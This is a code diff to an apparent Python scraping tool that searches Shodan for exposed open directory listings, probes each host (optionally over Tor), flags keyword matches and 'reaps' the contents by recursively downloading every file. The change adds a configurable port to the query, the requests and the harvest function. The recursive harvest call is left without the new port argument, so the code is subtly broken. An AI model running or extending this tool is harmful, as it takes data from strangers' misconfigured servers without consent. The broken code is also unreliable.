@@ -129,7 +129,7 @@ def key_words(content,ip_addr):
     return word_found
 
 
-def do_request(reap,notor,ig_hist):
+def do_request(reap,notor,ig_hist,port):
     # Setup session
     s = requests.Session()
     pre = requests.get("http://icanhazip.com")
@@ -156,7 +156,7 @@ def do_request(reap,notor,ig_hist):
     for target in targets:
         try:
             if(target.strip()+"\n" not in history or ig_hist):
-                r = s.get(f"http://{target.strip()}:8000/",timeout=10)
+                r = s.get(f"http://{target.strip()}:{port}/",timeout=10)
                 print(Fore.RESET+f"{target.strip()}, Status Code: {r.status_code}")
                 w_history.write(target.strip()+"\n")
                 key = key_words(r.content,target.strip())
@@ -170,16 +170,16 @@ def do_request(reap,notor,ig_hist):
                     harvester = input(Fore.RESET+"Would you like to reap (Y/n/X)> ")
                     if(harvester.upper() == 'Y' or harvester.upper() == 'X'):
                         if(harvester.upper()=='Y'):
-                            harvest(s,target.strip(),r.content.decode(),"/",False)
+                            harvest(s,target.strip(),r.content.decode(),"/",False,port)
                         else:
-                            harvest(s,target.strip(),r.content.decode(),"/",True)
+                            harvest(s,target.strip(),r.content.decode(),"/",True,port)
                 
         except (ConnectionError, Timeout, RequestException):
             print(Fore.RED + f"{target.strip()}, is not responsive")
     w_history.close()
 
 
-def harvest(s,ip,content,working_file,X):
+def harvest(s,ip,content,working_file,X,port):
     if(X == False):
         print(f"\nDir: {working_file} contains:")
         for line in content.split("\n"):
@@ -200,13 +200,13 @@ def harvest(s,ip,content,working_file,X):
             file = line.split("href=\"")[1].split("\"")[0]
             if("/" in file):
                 print("Crawling: "+working_file+file)
-                rep = s.get(f"http://{ip}:8000{working_file}{file}")
+                rep = s.get(f"http://{ip}:{port}{working_file}{file}")
                 harvest(s,ip,rep.content.decode(),working_file+file,X)
                 if not os.path.exists(ip+working_file+file):
                     os.makedirs(ip+working_file+file)
             else:
                 print(f"Getting: {file}")
-                rep = s.get(f"http://{ip}:8000{working_file}{file}",stream=True, timeout=30)
+                rep = s.get(f"http://{ip}:{port}{working_file}{file}",stream=True, timeout=30)
                 w_file = open(f"{ip}{working_file}{file}",'wb')
                 w_file.write(rep.content)
                 w_file.close()
@@ -227,12 +227,19 @@ if __name__ == "__main__":
     parser.add_argument('-x','--full',action='store_true',help="Full send it all")
     parser.add_argument('-t','--notor',action='store_true',help="Dont use tor")
     parser.add_argument('-i','--ig_hist',action='store_true',help="Ignore history file")
+    parser.add_argument('-p','--port',help="Specify port number (Default 8000)")
     args=parser.parse_args()
     # conduct the shodan query to get the results
     reap = (args.reap or args.full)
     if(args.query or args.full):
-        do_query(setup_api(), 'Title:"Directory listing for /" port:8000')
+        if(args.port):
+            do_query(setup_api(), f'Title:"Directory listing for /" port:{args.port}')
+        else:
+            do_query(setup_api(), 'Title:"Directory listing for /" port:8000')
         sleep(1.0)
     # perform the requests which will loop through the results in results.txt
     if(args.scan or args.full):
-        do_request(args.reap,args.notor,args.ig_hist)
+        if(args.port):
+            do_request(args.reap,args.notor,args.ig_hist,args.port)
+        else:
+            do_request(args.reap,args.notor,args.ig_hist,"8000")
